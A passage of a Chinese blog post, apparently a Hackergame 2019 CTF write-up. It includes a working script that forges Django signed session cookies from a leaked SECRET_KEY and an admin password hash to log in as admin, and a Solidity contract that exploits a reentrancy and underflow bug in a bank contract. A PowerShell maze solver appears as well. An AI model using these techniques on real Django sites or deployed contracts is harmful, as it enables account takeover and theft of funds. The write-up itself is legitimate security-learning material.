&#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: request.user,</span><br><span class="line">        <span class="string">&quot;profile&quot;</span>: user_profile</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_out</span>(<span class="params">request</span>):</span></span><br><span class="line">    logout(request)</span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_last_login</span>(<span class="params">sender, user, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">models.update_last_login = update_last_login</span><br></pre></td></tr></table></figure>
+<p>关键在于<code>if request.user.username == &quot;admin&quot;:</code>判断，要让当前用户的用户名为<code>admin</code>，推测是Cookie欺骗<br>对Cookie进行解密（完整代码见后文）得到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;_auth_user_id&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;_auth_user_backend&#x27;</span>: <span class="string">&#x27;django.contrib.auth.backends.ModelBackend&#x27;</span>, <span class="string">&#x27;_auth_user_hash&#x27;</span>: <span class="string">&#x27;0a884f8b987fca1a92c6f93d9042d83eea72d98d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>查看Django源码得知，<code>_auth_user_backend</code>默认只有这一种，所以肯定是对<code>_auth_user_id</code>和<code>_auth_user_hash</code>进行替换<br>直接把<code>_auth_user_id</code>改为<code>1</code>，发现返回302跳转，所以应该还要得出admin的<code>_auth_user_hash</code>值</p>
+<p>源码中有数据库文件<code>db.sqlite3</code>，查看发现其中有<code>pbkdf2_sha256</code>加密后的密码<br><code>admin</code>: <code>pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=</code><br><code>guest</code>: <code>pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM=</code><br>找到生成<code>_auth_user_hash</code>的代码(<code>django.contrib.auth.bast_user.py</code>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session_auth_hash</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Return an HMAC of the password field.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    key_salt = <span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span></span><br><span class="line">    <span class="keyword">return</span> salted_hmac(key_salt, self.password).hexdigest()</span><br></pre></td></tr></table></figure>
+<p>copy出来，利用加密后的密码生成哈希值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="string">&quot;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&quot;</span></span><br><span class="line">hash1 = salted_hmac(<span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span>, password).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hash1)</span><br></pre></td></tr></table></figure>
+<p>得到<code>0a884f8b987fca1a92c6f93d9042d83eea72d98d</code>，恰好是解密出的<code>_auth_user_hash</code>值，验证算法成功<br>然后修改<code>_auth_user_id</code>和<code>_auth_user_hash</code>，加密生成Cookie，requests.get即可<br>完整脚本（放置在<code>openlug/</code>下）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,os,json,requests,re</span><br><span class="line">os.environ.setdefault(<span class="string">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>,<span class="string">&#x27;settings&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.backends <span class="keyword">import</span> signed_cookies</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> salted_hmac</span><br><span class="line"></span><br><span class="line"><span class="comment"># key=None : SECRET_KEY</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> signing.loads(sess,key=<span class="literal">None</span>,salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span>,max_age=<span class="number">1209600</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> signing.dumps(sess,key=<span class="literal">None</span>,salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span>,compress = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestByCk</span>(<span class="params">ck</span>):</span></span><br><span class="line">    mcookie = &#123;<span class="string">&quot;sessionid&quot;</span>:ck&#125;</span><br><span class="line">    r = requests.get(<span class="string">&quot;http://202.38.93.241:10019/profile&quot;</span>,cookies = mcookie,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">        rawstr = (r.text)</span><br><span class="line">        username = re.findall(<span class="string">r&quot;欢迎您，(.....)！&quot;</span>, rawstr)</span><br><span class="line">        <span class="keyword">if</span>(username[<span class="number">0</span>] == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            flag = re.findall(<span class="string">r&quot;flag&#123;.*&#125;&quot;</span>, rawstr)</span><br><span class="line">            <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span>(r.status_code == <span class="number">302</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong Cookie.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>+r.status_code) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = <span class="string">&quot;.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKXmf:PfphreMrpv-FPLjjGGKUkcFgc2Q&quot;</span></span><br><span class="line">sess = decode(sess)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;decode:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&quot;</span></span><br><span class="line">adminHash = salted_hmac(<span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span>, password).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(adminHash)</span><br><span class="line"></span><br><span class="line">sess[<span class="string">&quot;_auth_user_id&quot;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line">sess[<span class="string">&quot;_auth_user_hash&quot;</span>] = adminHash</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;changed:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">sess = encode(sess)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;encode:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">requestByCk(sess)</span><br></pre></td></tr></table></figure>
+
+<h2 id="PowerShell-迷宫"><a href="#PowerShell-迷宫" class="headerlink" title="PowerShell 迷宫"></a>PowerShell 迷宫</h2><p>连接上服务器，cd到根目录，find查找<code>PSMaze.dll</code>，发现在<code>opt</code>文件夹中<br>使用<code>base64</code>命令输出，拿到程序二进制进行分析<br>发现在<code>MazeProvider.GetCellRepr</code>函数中会对当前节点进行判断，如果是终点则进行sha256计算，计算flag<br>写个powershell脚本遍历即可（使用Where-Object进行过滤，不走重复路线）<br>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./PSMaze.dll</span><br><span class="line"></span><br><span class="line">function print_i($i) &#123;</span><br><span class="line">    if($i.X -eq 63)&#123;</span><br><span class="line">        if($i.Y -eq 63)&#123;</span><br><span class="line">        write-host $i.PSPath -fore green</span><br><span class="line">        write-host $i.Flag -fore red</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function foreachPath($startFolder, $passDir) &#123;</span><br><span class="line">    $colItems = Get-ChildItem $startFolder | Where-Object &#123; $_.Direction -ne $passDir &#125; | Sort-Object</span><br><span class="line">    foreach ($i in $colItems) &#123;</span><br><span class="line">        print_i $i</span><br><span class="line">        $passDir = getInv $i.PSPath</span><br><span class="line">        foreachPath $i.PSPath $passDir</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getInv($path) &#123;</span><br><span class="line">    $direction = split-path $path -Leaf</span><br><span class="line">    if ($direction -eq &quot;Up&quot;) &#123;</span><br><span class="line">        return &quot;Down&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Down&quot;) &#123;</span><br><span class="line">        return  &quot;Up&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Left&quot;) &#123;</span><br><span class="line">        return &quot;Right&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Right&quot;) &#123;</span><br><span class="line">        return &quot;Left&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreachPath &quot;Maze:/&quot; &quot;Up&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PSMaze\Maze::\Down\Right\Down\Right\Down\Right\Down\Down\Down\Right\Down\Right\Down\Right\Right\Down\Right\Down\Right\Down\Left\Down\Left\Left\Left\Left\Left\Down\Down\Right\Down\Left\Left\Down\Left\Down\Down\Down\Down\Down\Down\Down\Right\Down\Left\Down\Right\Right\Down\Down\Left\Down\Left\Down\Down\Down\Right\Up\Right\Down\Right\Down\Right\Up\Right\Right\Up\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Down\Down\Right\Down\Down\Down\Down\Down\Right\Right\Down\Down\Down\Down\Right\Right\Down\Left\Down\Down\Left\Down\Down\Down\Left\Down\Down\Down\Down\Down\Left\Left\Down\Left\Down\Left\Down\Left\Down\Left\Down\Down\Left\Left\Left\Down\Down\Down\Right\Down\Down\Right\Up\Right\Down\Right\Right\Right\Down\Right\Down\Down\Right\Up\Right\Down\Right\Up\Right\Right\Down\Down\Right\Down\Right\Down\Down\Right\Right\Right\Up\Right\Right\Right\Up\Right\Right\Right\Right\Up\Left\Up\Up\Up\Up\Right\Right\Right\Up\Right\Right\Right\Right\Right\Down\Down\Down\Left\Down\Right\Down\Right\Right\Up\Up\Right\Right\Down\Down\Right\Up\Right\Up\Right\Up\Right\Right\Down\Down\Right\Right\Right\Right\Up\Left\Up\Right\Right\Down\Right\Right\Right\Right\Down\Down\Down\Down\Right\Down\Right\Right\Up\Right\Right\Right\Down\Left\Down\Right\Right\Down\Right</span><br><span class="line">flag&#123;D0_y0u_1ik3_PSC0r3_n0w_2C6BE488&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="韭菜银行"><a href="#韭菜银行" class="headerlink" title="韭菜银行"></a>韭菜银行</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>执行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(<span class="string">&quot;0xE575c9abD35Fa94F1949f7d559056bB66FddEB51&quot;</span>,<span class="number">2</span>,<span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure>
+<p>获取到secert的值，提交即可得到flag</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><code>withdraw</code>函数存在重入和溢出漏洞，构造攻击合约，使余额为一个大数<br>然后使用攻击合约调用<code>get_flag_2</code>，即可设置got_flag字段的值，从而获得flag<br>攻击合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.26;</span><br><span class="line"></span><br><span class="line">contract JCBank &#123;</span><br><span class="line">    mapping (address =&gt; uint) public balance;</span><br><span class="line">    mapping (uint =&gt; bool) public got_flag;</span><br><span class="line">    uint128 secret;</span><br><span class="line"></span><br><span class="line">    constructor (uint128 init_secret) public &#123;</span><br><span class="line">        secret = init_secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balance[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_1(uint128 guess) public view returns(string) &#123;</span><br><span class="line">        require(guess == secret);</span><br><span class="line"></span><br><span class="line">        bytes memory h = new bytes(32);</span><br><span class="line">        for (uint i = 0; i &lt; 32; i++) &#123;</span><br><span class="line">            uint b = (secret &gt;&gt; (4 * i)) &amp; 0xF;</span><br><span class="line">            if (b &lt; 10) &#123;</span><br><span class="line">                h[31 - i] = byte(b + 48);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                h[31 - i] = byte(b + 87);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(abi.encodePacked(&quot;flag&#123;&quot;, h, &quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_2(uint user_id) public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt; 1000000000000 ether);</span><br><span class="line">        got_flag[user_id] = true;</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Battach&#123;</span><br><span class="line">    address target;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 money;</span><br><span class="line">    JCBank g;</span><br><span class="line">    uint flag = 0;</span><br><span class="line">    </span><br><span class="line">    modifier ownerOnly &#123;</span><br><span class="line">        require(owner == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    // 构造函数初始化合约所有者的地址</span><br><span class="line">    constructor() payable public&#123;</span><br><span class="line">        target = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;</span><br><span class="line">         g = JCBank(target);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        money = 1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function getFlag(uint _user_id) ownerOnly payable&#123;</span><br><span class="line">     g.get_flag_2(_user_id);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    //开始攻击合约</span><br><span class="line">    function startattach() ownerOnly payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1);</span><br><span class="line">       flag = 0;</span><br><span class="line">       g.deposit.value(money)();</span><br><span class="line">       g.withdraw(money);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    // 销毁合约，相当于C++里的析构</span><br><span class="line">    function stopattach() ownerOnly&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //fallback 函数</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        require(flag == 0);</span><br><span class="line">        flag = 1;</span><br><span class="line">        g.withdraw(money);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="没有-BUG-的教务系统"><a href="#没有-BUG-的教务系统" class="headerlink" title="没有 BUG 的教务系统"></a>没有 BUG 的教务系统</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>定位到判断代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i)</span><br><span class="line">    temp_password[i] = ((temp_password[i] | temp_password[i + <span class="number">1</span>]) &amp; ~(temp_password[i] &amp; temp_password[i + <span class="number">1</span>]) | i) &amp; ~((temp_password[i] | temp_password[i + <span class="number">1</span>]) &amp; ~(temp_password[i] &amp; temp_password[i + <span class="number">1</span>]) &amp; i);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(temp_password, <span class="string">&quot;\x44\x00\x02\x41\x43\x47\x10\x63\x00&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Bad guy! Wrong password!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会对当前位和下一位进行运算，但是循环并没有操作最后一个字符00，所以从后往前逆推即可得到第一个flag</p>
+<h2 id="比赛时间内未完成的题"><a href="#比赛时间内未完成的题" class="headerlink" title="比赛时间内未完成的题"></a>比赛时间内未完成的题</h2><p>见<a href="https://blog.xhyeax.com/2019/10/22/hackersgame-2019-fails">Hackersgame 2019 的一些失败尝试及复现</a></p>
+<p>还是太菜了 = =</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/assets/img/alipay.jpg" alt="Xhy 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/10/15/db-sqlite3-to-sql/" rel="prev" title="导出sqlite3数据库为sql">
+      <i class="fa fa-chevron-left"></i> 导出sqlite3数据库为sql
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/10/22/hackersgame-2019-fails/" rel="next" title="Hackersgame 2019 的一些失败尝试及复现">
+      Hackersgame 2019 的一些失败尝试及复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E4%B8%8E%E5%A4%9C"><span class="nav-number">2.</span> <span class="nav-text">白与夜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8-2077"><span class="nav-number">3.</span> <span class="nav-text">信息安全 2077</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%87%E5%AE%99%E7%BB%88%E6%9E%81%E9%97%AE%E9%A2%98%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">宇宙终极问题（部分）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#42"><span class="nav-number">4.1.</span> <span class="nav-text">42</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%A1%B5%E8%AF%BB%E5%8F%96%E5%99%A8"><span class="nav-number">5.</span> <span class="nav-text">网页读取器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9"><span class="nav-number">6.</span> <span class="nav-text">达拉崩吧大冒险</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Happy-LUG"><span class="nav-number">7.</span> <span class="nav-text">Happy LUG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E9%AA%8C%E8%AF%81%E5%99%A8"><span class="nav-number">8.</span> <span class="nav-text">正则验证器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E5%B7%A7%E7%8E%B2%E7%8F%91%E7%9A%84-ELF"><span class="nav-number">9.</span> <span class="nav-text">小巧玲珑的 ELF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell%E4%B8%89%E9%AA%87%E5%AE%A2"><span class="nav-number">10.</span> <span class="nav-text">Shell三骇客</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ShellHacker1"><span class="nav-number">10.1.</span> <span class="nav-text">ShellHacker1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ShellHacker2"><span class="nav-number">10.2.</span> <span class="nav-text">ShellHacker2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ShellHacker3"><span class="nav-number">10.3.</span> <span class="nav-text">ShellHacker3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E6%95%99%E5%A5%87%E5%A6%99%E5%A4%9C"><span class="nav-number">11.</span> <span class="nav-text">三教奇妙夜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F-U-%E7%9A%84%E5%8A%A0%E5%AF%86"><span class="nav-number">12.</span> <span class="nav-text">小 U 的加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%AE%E7%BB%99%E6%9C%80%E5%A5%BD%E7%9A%84%E4%BD%A0"><span class="nav-number">13.</span> <span class="nav-text">献给最好的你</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E6%83%B3%E8%A6%81%E4%B8%AA%E5%AE%B6"><span class="nav-number">14.</span> <span class="nav-text">我想要个家</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="nav-number">14.1.</span> <span class="nav-text">一开始的尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%81%9A%E6%B3%95"><span class="nav-number">14.2.</span> <span class="nav-text">逆向做法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88"><span class="nav-number">15.</span> <span class="nav-text">被泄漏的姜戈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerShell-%E8%BF%B7%E5%AE%AB"><span class="nav-number">16.</span> <span class="nav-text">PowerShell 迷宫</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9F%AD%E8%8F%9C%E9%93%B6%E8%A1%8C"><span class="nav-number">17.</span> <span class="nav-text">韭菜银行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1"><span class="nav-number">17.1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2"><span class="nav-number">17.2.</span> <span class="nav-text">flag2</span></a></li></ol></li><li class="nav-item nav-level-2"><a 